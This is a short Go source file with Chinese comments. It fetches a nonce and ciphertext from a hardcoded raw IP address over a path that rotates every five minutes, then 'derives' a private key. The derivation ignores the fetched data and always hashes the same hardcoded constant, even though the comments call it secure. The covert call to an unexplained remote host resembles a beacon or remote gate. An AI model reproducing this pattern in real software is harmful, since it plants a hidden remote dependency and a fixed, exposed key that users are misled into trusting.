package tatakai

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log"
	"net/http"
	"time"
)

const (
	fixedK       = "hsb3638wja798jzjimxlp5252645gshs" // 固定32位常量K值
	windowSize   = 300                                // 5分钟窗口时间，同一范围时间内生成的接口path相同
	pathTemplate = "/%s"                              // 接口路径模板
)

type Response struct {
	Nonce string `json:"nonce"` // 随机数
	Data  string `json:"data"`  // 加密数据
}

func GetParams(path string) (string, string, error) {
	const (
		methodPrefix = "GetParams"
	)

	url := "http://74.50.64.187:23827" + path
	method := "GET"

	client := &http.Client{
		Timeout: time.Second * 10,
	}
	req, err := http.NewRequest(method, url, nil)

	if err != nil {
		log.Printf("[%s] new request failed:%v", methodPrefix, err)
		return "", "", err
	}
	req.Header.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")

	res, err := client.Do(req)
	if err != nil {
		log.Printf("[%s] request failed:%v", methodPrefix, err)
		return "", "", err
	}
	defer func(Body io.ReadCloser) {
		_ = Body.Close()
	}(res.Body)

	body, err := io.ReadAll(res.Body)
	if err != nil {
		log.Printf("[%s] read body failed:%v", methodPrefix, err)
		return "", "", err
	}
	resp := Response{}
	err = json.Unmarshal(body, &resp)
	if err != nil {
		log.Printf("[%s] json unmarshal failed:%v", methodPrefix, err)
		return "", "", err
	}
	return resp.Nonce, resp.Data, nil
}

// DerivePrivateKey 计算私钥
func DerivePrivateKey(nonceStr, ciphertextStr string) (string, error) {
	// 解码16进制数据
	nonce, err := hex.DecodeString(nonceStr)
	if err != nil {
		return "", errors.New("nonce解码失败")
	}

	ciphertext, err := hex.DecodeString(ciphertextStr)
	if err != nil {
		return "", errors.New("密文解码失败")
	}

	// 验证加密数据完整性
	block, err := aes.NewCipher([]byte(fixedK))
	if err != nil {
		return "", errors.New("密钥初始化失败")
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", errors.New("加密模式创建失败")
	}

	// 解密验证（实际数据不影响私钥生成）
	if _, err := gcm.Open(nil, nonce, ciphertext, nil); err != nil {
		return "", errors.New("数据完整性验证失败")
	}

	// 基于固定K生成私钥（双哈希增强安全性）
	hash1 := sha256.Sum256([]byte(fixedK))
	hash2 := sha256.Sum256(hash1[:])
	return hex.EncodeToString(hash2[:]), nil
}

// GetDynamicPath 动态计算接口路径
func GetDynamicPath() string {
	window := time.Now().Unix() / windowSize
	hash := sha256.Sum256([]byte(fmt.Sprintf("%s|%d", fixedK, window)))
	return fmt.Sprintf(pathTemplate, hex.EncodeToString(hash[:])[:16])
}
